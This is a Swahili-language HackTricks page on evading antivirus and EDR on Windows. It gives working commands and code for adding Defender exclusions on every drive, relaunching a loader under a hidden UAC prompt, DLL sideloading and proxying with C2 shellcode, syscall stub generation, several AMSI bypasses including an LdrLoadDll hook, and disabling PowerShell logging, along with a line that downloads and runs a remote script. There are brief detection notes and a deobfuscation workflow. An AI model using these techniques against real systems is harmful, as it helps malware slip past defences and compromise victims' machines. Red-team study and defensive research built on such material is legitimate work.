# Kukwepa Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Tool ya kusimamisha Windows Defender kwa kujifanya kuwa ni AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Ujanja wa UAC wa aina ya installer kabla ya kuingilia Defender

Loaders za umma zinazojifanya kuwa game cheats mara nyingi husafirishwa kama installers za Node.js/Nexe zisizo na saini, ambazo kwanza **humwomba mtumiaji ruhusa ya elevation** na kisha tu kuizima Defender. Mtiririko ni rahisi:

1. Kagua ikiwa kuna muktadha wa kiutawala kwa kutumia `net session`. Command hii hufaulu tu wakati anayeitekeleza ana haki za admin, hivyo kutofaulu kunaonyesha kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Iwashe tena mara moja kwa kutumia verb ya `RunAs` ili kuanzisha ombi linalotarajiwa la idhini ya UAC huku ukihifadhi command line ya awali.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini kuwa wanasakinisha software ya “cracked”, kwa hiyo prompt hukubaliwa kwa kawaida, na kuipa malware ruhusa inayohitaji kubadilisha policy ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` kwa kila drive letter

Baada ya kupata privileges zilizoinuliwa, chains za mtindo wa GachiLoader huongeza blind spots za Defender badala ya kuzima service moja kwa moja. Loader huanza kwa kuua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), kisha kusukuma **exclusions pana sana** ili kila user profile, system directory na removable disk isiweze kuscanwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Uchunguzi muhimu:

- Loop hupitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, n.k.), kwa hiyo **payload yoyote ya baadaye itakayowekwa popote kwenye disk itapuuzwa**.
- Exclusion ya extension ya `.sys` inalenga baadaye—attackers wanahifadhi chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- Mabadiliko yote yanawekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo stages za baadaye zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuzipanua bila ku-trigger UAC tena.

Kwa kuwa hakuna Defender service inayosimamishwa, health checks rahisi zitaendelea kuripoti “antivirus active” ingawa real-time inspection haigusi kamwe paths hizo.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia methods tofauti kuangalia ikiwa file ni malicious au la: static detection, dynamic analysis, na kwa EDRs za advanced zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa ku-flag strings au arrays za bytes zinazojulikana kuwa malicious ndani ya binary au script, na pia kutoa taarifa kutoka kwenye file lenyewe (mfano file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukufanya ukamatwe kwa urahisi zaidi, kwa sababu huenda tayari zimechanganuliwa na ku-flag kama malicious. Kuna njia kadhaa za kukwepa aina hii ya detection:

- **Encryption**

Uki-encrypt binary, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji loader wa aina fulani ili ku-decrypt na ku-run program hiyo kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji kufanya ni kubadilisha strings fulani ndani ya binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda kulingana na unachojaribu ku-obfuscate.

- **Custom tooling**

Ukitengeneza tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii inahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya ku-check dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya file katika segments nyingi, kisha humwomba Defender i-scan kila moja moja; kwa njia hii, inaweza kukuonyesha strings au bytes zilizo-flag ndani ya binary yako.

Ninapendekeza sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) hii kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapo-run binary yako ndani ya sandbox na kuangalia malicious activity (mfano kujaribu ku-decrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya kazi nayo, lakini hapa kuna mambo unayoweza kufanya ili kukwepa sandboxes.

- **Sleep kabla ya execution** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa AV's dynamic analysis. AVs huwa na muda mfupi sana wa ku-scan files ili zisikatize workflow ya mtumiaji, kwa hiyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep hiyo kulingana na jinsi ilivyotekelezwa.
- **Ku-check resources za machine** Kwa kawaida Sandboxes huwa na resources chache sana za kutumia (mfano < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya mtumiaji. Unaweza pia kuwa creative sana hapa, kwa mfano ku-check temperature ya CPU au hata fan speeds; si kila kitu kitatekelezwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imejiunga na domain ya "contoso.local", unaweza ku-check domain ya computer ili kuona kama inalingana na uliyoainisha; ikiwa hailingani, unaweza kuifanya program yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hiyo unaweza ku-check computer name ndani ya malware yako kabla ya detonation. Ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kuifanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya tips nyingine nzuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) za kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema awali katika post hii, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kufanya dump ya LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project nyingine isiyojulikana sana ambayo pia hufanya dump ya LSASS?

Jibu sahihi huenda likawa la pili. Tukitumia mimikatz kama mfano, huenda ikawa mojawapo ya malware zilizo-flag zaidi na AVs na EDRs, ikiwa siyo iliyo-flag zaidi; ingawa project yenyewe ni nzuri sana, pia ni nightmare kufanya nayo kazi ili kukwepa AVs. Kwa hiyo tafuta tu alternatives za kile unachojaribu kutimiza.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **umezima automatic sample submission** kwenye Defender, na tafadhali, kwa uzito, **USI-UPLOAD KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka ku-check kama payload yako inagunduliwa na AV fulani, i-install kwenye VM, jaribu kuzima automatic sample submission, kisha i-test humo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, kila mara **weka kipaumbele kutumia DLLs kwa evasion**. Kwa uzoefu wangu, DLL files kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, hivyo hii ni trick rahisi sana ya kuepuka detection katika baadhi ya hali (ikiwa payload yako ina njia ya ku-run kama DLL, bila shaka).

Kama tunavyoona kwenye image hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison ya normal Havoc EXE payload dhidi ya normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha tricks kadhaa unazoweza kutumia na DLL files ili ziwe stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia DLL search order inayotumiwa na loader kwa kuweka victim application na malicious payload(s) zote pamoja.

Unaweza ku-check programs zilizo susceptible kwa DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itatoa orodha ya programs zilizo katika hatari ya DLL hijacking ndani ya "C:\Program Files\\" pamoja na DLL files zinazojaribu kupakia.

Ninapendekeza sana **uchunguze DLL Hijackable/Sideloadable programs mwenyewe**; technique hii huwa stealthy sana ikifanywa ipasavyo, lakini ukitumia DLL Sideloadable programs zinazojulikana hadharani, unaweza kukamatwa kwa urahisi.

Kuweka tu malicious DLL yenye jina ambalo program inatarajia kupakia hakutapakia payload yako, kwa sababu program inatarajia functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia technique nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huforward calls ambazo program hufanya kutoka kwenye proxy (na malicious) DLL kwenda kwenye original DLL, hivyo kuhifadhi functionality ya program na kuwezesha kushughulikia execution ya payload yako.

Nitatumia project ya [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo chanzi wa DLL, na DLL asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyo-encode kwa [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zilikuwa na Detection rate ya 0/26 katika [antiscan.me](https://antiscan.me)! Naweza kusema huo ni ufaulu.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [Twitch VOD ya S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading, pamoja na [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), ili ujifunze zaidi kuhusu tuliyojadili kwa undani.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, export entry huwa na ASCII string ya muundo `TargetDll.TargetFunc`. Caller anapotatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, normal DLL search order hutumika, ikijumuisha directory ya module inayofanya forward resolution.

Hii huwezesha indirect sideloading primitive: tafuta signed DLL inayofanya export ya function iliyo-forwarded kwenda kwenye non-KnownDLL module name, kisha iweke signed DLL hiyo pamoja na attacker-controlled DLL yenye jina linalolingana kabisa na forwarded target module. Forwarded export inapoitwa, loader itatatua forward hiyo na kupakia DLL yako kutoka directory hiyo hiyo, kisha kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, hivyo hutafutwa kwa kutumia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili signed system DLL kwenye folda inayoweza kuandikwa muda
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi katika folda hiyo hiyo. `DllMain` ya msingi inatosha kupata utekelezaji wa code; huhitaji kutekeleza function iliyo-forwardiwa ili kuchochea `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyozingatiwa:
- rundll32 (iliyotiwa sahihi) hupakia `keyiso.dll` ya side-by-side (iliyotiwa sahihi)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imeendeshwa

Vidokezo vya hunting:
- Lenga forwarded exports ambapo target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia tooling kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama inventory ya Windows 11 forwarder ili kutafuta candidates: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya detection/defense:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLL zilizotiwa saini kutoka kwenye paths zisizo za mfumo, kisha kupakia non-KnownDLLs zenye base name sawa kutoka kwenye directory hiyo
- Toa alert kuhusu process/module chains kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` chini ya paths zinazoweza kuandikwa na mtumiaji
- Tekeleza code integrity policies (WDAC/AppLocker) na kataza write+execute katika application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit ya kubypass EDRs kwa kutumia suspended processes, direct syscalls, na alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee tool moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Mara nyingi EDR huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kuzalisha syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kufanya mpito kwenda kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` ndani ya generated stub (hakuna `ntdll` export hit).
- **Indirect**: ruka kwenda kwenye syscall gadget iliyopo ndani ya `ntdll` ili mpito kwenda kernel uonekane umetoka `ntdll` (hii ni muhimu kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka static `0F 05` opcode sequence kwenye disk; resolve syscall sequence wakati wa runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: kadiria SSNs kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: map `\KnownDlls\ntdll.dll` iliyo safi, soma SSNs kutoka kwenye `.text` yake, kisha unmap (hupita hooks zote za in-memory).
- **RecycledGate**: changanya VA-sorted SSN inference na opcode validation wakati stub iko safi; ikiwa imehookiwa, tumia VA inference.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua bytes zilizohookiwa.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza kuchanganua **files kwenye disk** pekee, hivyo kama ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa kwenye vipengele hivi vya Windows.

- User Account Control, au UAC (elevation ya usakinishaji wa EXE, COM, MSI, au ActiveX)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Huruhusu antivirus solutions kukagua tabia ya scripts kwa kufichua contents za scripts katika hali ambayo haina encryption wala obfuscation.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` itazalisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, ikifuatiwa na path ya executable ambayo script iliendeshwa kutoka kwake, katika hali hii, powershell.exe

Hatuku-drop file yoyote kwenye disk, lakini bado tulikamatwa tukiwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitishwa kupitia AMSI. Hii hata inaathiri `Assembly.Load(byte[])` inayotumika kupakia execution kwenye memory. Ndiyo sababu kutumia versions za chini za .NET (kama 4.7.2 au chini) kunapendekezwa kwa execution kwenye memory ikiwa unataka ku-evade AMSI.

Kuna njia kadhaa za kupita AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa na static detections, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya ku-evade detection.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata ikiwa zina layers nyingi, hivyo obfuscation inaweza kuwa chaguo baya kulingana na jinsi inavyofanywa. Hii hufanya ku-evade isiwe straightforward. Ingawa, wakati mwingine unachohitaji kufanya ni kubadilisha majina ya variables kadhaa tu na utakuwa sawa, kwa hiyo inategemea kiwango ambacho kitu kimeflag.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL kwenye process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa unaendesha kama unprivileged user. Kwa sababu ya dosari hii katika implementation ya AMSI, researchers wamepata njia nyingi za ku-evade AMSI scanning.

**Forcing an Error**

Kulazimisha AMSI initialization ishindwe (amsiInitFailed) kutasababisha hakuna scan itakayoanzishwa kwa process ya sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature kuzuia matumizi yake kwa kiwango kikubwa.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Kilichohitajika ni mstari mmoja tu wa powershell code kuifanya AMSI isiweze kutumika kwa mchakato wa sasa wa powershell. Bila shaka, mstari huu umetambuliwa na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia technique hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka kwamba huenda hii ika-flagged pindi post hii itakapotoka, kwa hivyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki undetected.

**Memory Patching**

Technique hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya `"AmsiScanBuffer"` katika amsi.dll (inayohusika na kuscan input iliyotolewa na mtumiaji) na kui-overwrite kwa instructions za kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya scan halisi yatakuwa 0, ambayo hutafsiriwa kama clean result.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna techniques nyingine nyingi zinazotumika kubypass AMSI kwa powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye process ya sasa. Bypass imara isiyofungamana na language ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha error wakati module iliyoombwa ni `amsi.dll`. Kwa sababu hiyo, AMSI haipakiwi kamwe na hakuna scans zinazofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders kwa pamoja (chochote ambacho kingepakia AMSI).
- Iunganishe na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka artefacts ndefu za command-line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kubypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kubypass AMSI inayokwepa signature kwa kutumia function na variables zilizobainishwa na mtumiaji kwa mpangilio wa nasibu, character expressions, na kutumia random character casing kwenye keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa AMSI signature iliyogunduliwa kutoka kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuscan memory ya process ya sasa kutafuta AMSI signature, kisha kui-overwrite kwa NOP instructions, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la Powershell 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuscanwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuruhusu kurekodi commands zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kukwepa detection**.

Ili kubypass PowerShell logging, unaweza kutumia techniques zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitaload, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuhost PowerShell bila ku-launch `powershell.exe` (approach inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa controls zinazohusishwa mahususi na process ya `powershell.exe`, lakini yenyewe haizimi AMSI, Script Block Logging, au defense nyingine zote za PowerShell; coverage inategemea runtime na implementation ya host.


## Obfuscation

> [!TIP]
> Techniques kadhaa za obfuscation hutegemea kuencrypt data, jambo litakaloongeza entropy ya binary na kufanya iwe rahisi zaidi kwa AVs na EDRs kuigundua. Kuwa mwangalifu kuhusu hili na labda tumia encryption kwenye sections maalum tu za code yako ambazo ni sensitive au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Unapoanalysing malware inayotumia ConfuserEx 2 (au commercial forks), ni kawaida kukutana na layers kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow iliyo hapa chini hurejesha kwa uaminifu **IL iliyo karibu na ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# katika tools kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx hu-encrypt kila *method body* na hu-decrypt ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hupatch PE checksum, kwa hiyo modification yoyote ita-crash binary. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kurejesha XOR keys na kuandika upya assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output huwa na anti-tamper parameters 6 (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu unapotengeneza unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – peleka file *clean* kwenye **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itatengua control-flow flattening, kurejesha namespaces, classes na variable names za awali, na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls kuwa lightweight wrappers (zinazojulikana pia kama *proxy calls*) ili kuzuia decompilation zaidi. Ziondoe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

